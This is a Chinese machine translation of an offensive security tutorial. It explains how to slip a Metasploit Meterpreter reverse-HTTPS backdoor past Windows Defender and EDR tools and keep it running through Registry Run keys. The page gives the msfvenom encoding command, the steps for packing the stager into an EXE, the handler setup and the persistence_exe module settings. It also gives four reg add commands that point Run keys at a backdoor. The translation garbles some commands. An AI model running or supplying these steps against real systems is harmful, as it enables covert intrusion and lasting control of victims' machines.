<html>
<head>
<title>Evade EDR with Shellcode Injection and gain persistence using Registry Run Keys</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">通过外壳代码注入规避EDR，并使用注册表运行键获得持久性</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/evade-avs-edr-with-shellcode-injection-159dde4dba1a?source=collection_archive---------0-----------------------#2021-02-08">https://infosecwriteups.com/evade-avs-edr-with-shellcode-injection-159dde4dba1a?source=collection_archive---------0-----------------------#2021-02-08</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="ddae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在内部网络中获得立足点可能具有挑战性，因为AV和Defender使这变得更加困难。现代Windows版本已经采取了一些缓解措施，防止外壳代码正常运行。该问题是由外壳代码需要RWX内存这一事实引起的，该内存在执行外壳代码时被标记。</p><p id="5037" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">外壳代码注入在Pentesting期间可能对APT或Red Teamers非常有帮助，因为他们会注入恶意EXE并将进程迁移到EDR信任的EXE中。一点可疑的行为都没有！</p><h1 id="e2b5" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">加密C2通信</h1><p id="f0fe" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">不建议通过未加密的隧道传输数据，最好替换Metasploit在生成stager时使用的默认SSL，这样stager和C2框架之间的通信是加密的。我们可以为C2服务器端创建一个私有RSA密钥和一个服务器证书。</p><blockquote class="lo lp lq"><p id="91b9" class="jn jo lr jp b jq jr js jt ju jv jw jx ls jz ka kb lt kd ke kf lu kh ki kj kk ij bi translated">OpenSSL req-new-new key RSA:4096-days 365-nodes-x509-key out RSA private . key-out server certificate . CRT</p></blockquote><figure class="lw lx ly lz gt ma gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi lv"><img src="../Images/23a45fe03f7074d1fb90efc192823b5e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BkkGQXUKAbLK4QyAdUg1ww.png"/></div></div></figure><p id="0116" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后将它们合并到一个. pem文件中，我们就创建了一个串联证书。</p><blockquote class="lo lp lq"><p id="a80d" class="jn jo lr jp b jq jr js jt ju jv jw jx ls jz ka kb lt kd ke kf lu kh ki kj kk ij bi translated">cat RSA private . key server certificate . CRT &gt; my . PEM</p></blockquote><h1 id="6c71" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">生成编码外壳代码</h1><p id="cbfa" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">使用证书生成Metasploit stager，并使用<strong class="jp ir"> <em class="lr"> shikata_ga_nai </em> </strong>进行几乎混淆，以实现多态XOR加法反馈编码器。</p><blockquote class="lo lp lq"><p id="f05f" class="jn jo lr jp b jq jr js jt ju jv jw jx ls jz ka kb lt kd ke kf lu kh ki kj kk ij bi translated">MSF venom-p windows/meter preter/reverse _ winhttps LHOST = 192 . 168 . 1 . 46 LPORT = 8888—平台windows -a x86 HandlerSSLCert=。/my . PEM StagerVerifySSLCert = true-s 42-small-e x86/shikata _ ga _ nai-I 9-f raw | MSF venom-platform windows-a x86-e x86/call 4 _ dword _ xor-I 6-b " \ x00 \ x0a \ x0d "-f raw &gt; shellcode . raw</p></blockquote><figure class="lw lx ly lz gt ma gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mh"><img src="../Images/1005d8a9fcde94779e369ae0b1ba4696.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*r_Mn2ruiyf-OQ_q2kEOXuQ.png"/></div></div><figcaption class="mi mj gj gh gi mk ml bd b be z dk translated">9次迭代编码外壳代码</figcaption></figure><p id="b3a8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一旦shellcode生成成功，我们会将其打包成EXE。</p><h1 id="c3b5" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">打包外壳代码</h1><p id="5513" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">有一个开源工具叫做<a class="ae mm" href="https://github.com/TaroballzChen/shecodject" rel="noopener ugc nofollow" target="_blank">shecodnjet</a>，它可以很好地将我们生成的外壳代码打包成EXE。使用python3作为根用户打开工具:</p><blockquote class="lo lp lq"><p id="241c" class="jn jo lr jp b jq jr js jt ju jv jw jx ls jz ka kb lt kd ke kf lu kh ki kj kk ij bi translated">sudo python3 shecodnject.py</p></blockquote><p id="9e7b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">加载scc模块，设置我们之前生成的shellcode.raw文件，并运行该模块来读取文件中的shellcode。</p><blockquote class="lo lp lq"><p id="9ede" class="jn jo lr jp b jq jr js jt ju jv jw jx ls jz ka kb lt kd ke kf lu kh ki kj kk ij bi translated">scc <br/>设置source/set/location/to/shellcode . raw<br/>运行</p></blockquote><figure class="lw lx ly lz gt ma gh gi paragraph-image"><div class="gh gi mn"><img src="../Images/bc6a09d36d110351dbaef70c6b8edd15.png" data-original-src="https://miro.medium.com/v2/resize:fit:1118/format:webp/1*g6DM9bSHg5PT-6SYzHPgqQ.png"/></div></figure><p id="fe57" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通过键入<strong class="jp ir"> back </strong>退出模块。现在工具已经读取了外壳代码，我们将把它打包成一个EXE文件，因此请逐个输入以下命令:</p><blockquote class="lo lp lq"><p id="c0a2" class="jn jo lr jp b jq jr js jt ju jv jw jx ls jz ka kb lt kd ke kf lu kh ki kj kk ij bi translated">exe <br/>设置noconsole False <br/>运行</p></blockquote><p id="0ac8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">打包的过程需要一段时间。完成后，输出将保存在shecodeject文件夹内的/output中</p><p id="1184" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">EXE生成并准备躲避现代EDRs和Windows Defender。让我们测试它是否被Windows Defender检测到:</p><figure class="lw lx ly lz gt ma gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mo"><img src="../Images/dd137a094f3593fa055d8641932e6ccf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*d02_hB-bgzFhfVKKj8Keug.png"/></div></div><figcaption class="mi mj gj gh gi mk ml bd b be z dk translated">绕过Windows Defender</figcaption></figure><p id="03ef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它被绕过，根本没有检测到。现在是时候在Metasploit中设置一个监听器了，希望得到一个shell:</p><blockquote class="lo lp lq"><p id="23d8" class="jn jo lr jp b jq jr js jt ju jv jw jx ls jz ka kb lt kd ke kf lu kh ki kj kk ij bi translated">msfconsole -q -x '使用exploit/multi/handler；将ExitOnSession设置为false设置有效负载windows/meter preter/reverse _ winhttps；设置LHOST 192 . 168 . 1 . 46；设置LPORT 8888set handlers slcert/home/nade/Desktop/my . PEM；将StagerVerifySSLCert设置为true设置sessioncommunicationtime out 600；运行-j -z '</p></blockquote><figure class="lw lx ly lz gt ma gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mp"><img src="../Images/e47ed263866c21ed5e4b3d19aa0a1a90.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*09Qj60Exkjtej9HKp9GlJQ.png"/></div></div></figure><p id="2616" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了便于统计，这是在各种AVs中扫描时的检测率:</p><figure class="lw lx ly lz gt ma gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mq"><img src="../Images/07792ac861162b4a6c72d8677751ee26.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZvnQegj1lDzTCGrFIZ8mMg.png"/></div></div></figure><h1 id="3ecc" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">使用注册表运行键获得持久性</h1><p id="3226" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">对于持久性，我们将把我们的后门注入到注册表运行键中。幸运的是，Metasploit有一个针对这种端口利用的模块。该模块需要以下配置，并将可执行文件放在受损系统的可写位置。在这种情况下，我们将上传我们的后门程序，它与我们在目标机器上用来获取(在我们的本地机器上我称它为<strong class="jp ir">fin.exe</strong>)的后台程序是同一个后台程序- &gt; <strong class="jp ir"> C:\tmp\fin.exe </strong></p><p id="fe79" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先，我们上传fin.exe在<strong class="jp ir"> C:\tmp </strong></p><figure class="lw lx ly lz gt ma gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mr"><img src="../Images/c65a0c43edeeee65c1bca496d9d5d6fb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KZbAWjiVyMg-g7QLTCLmfA.png"/></div></div></figure><p id="d35e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe ms mt mu mv b">use post/windows/manage/persistence_exe<br/>set REXEPATH /home/nade/Desktop/fin.exe<br/>set REXENAME fin.exe<br/>set SESSION 2<br/>set STARTUP USER<br/>set LOCALEXEPATH C:\\tmp<br/>run</code></p><figure class="lw lx ly lz gt ma gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mw"><img src="../Images/9ee143010adbb25c2001e7d567a3b3a4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ehPmp6GPl5lmgHOINca9vw.png"/></div></div></figure><p id="2482" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下次用户登录系统时，将会打开一个新的Meterpreter会话(将会弹出一个黑色的cmd屏幕，执行后门程序，然后自动关闭)。</p><h1 id="3e56" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">以手工方式获得持久性</h1><p id="a55e" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">或者，您可以使用这些命令手动添加这4个注册表运行键，这样我们的后门<strong class="jp ir">fin.exe</strong>将被注入。在演示中，我添加了一个随机值<strong class="jp ir">not virus</strong>，但是你知道，你不想让它那样。在使用注册表之前，确保在目标系统中上传后门程序(在我的例子中是:<strong class="jp ir"> C:\tmp\fin.exe </strong>)。</p><pre class="lw lx ly lz gt mx mv my mz aw na bi"><span id="0d5f" class="nb km iq mv b gy nc nd l ne nf">reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v NotAVirus /t REG_SZ /d "C:\tmp\fin.exe"<br/><br/>reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v NotAVirus /t REG_SZ /d "C:\tmp\fin.exe"<br/><br/>reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v NotAVirus /t REG_SZ /d "C:\tmp\fin.exe"<br/><br/>reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v NotAVirus /t REG_SZ /d "C:\tmp\fin.exe"</span></pre></div></div>    
</body>
</html>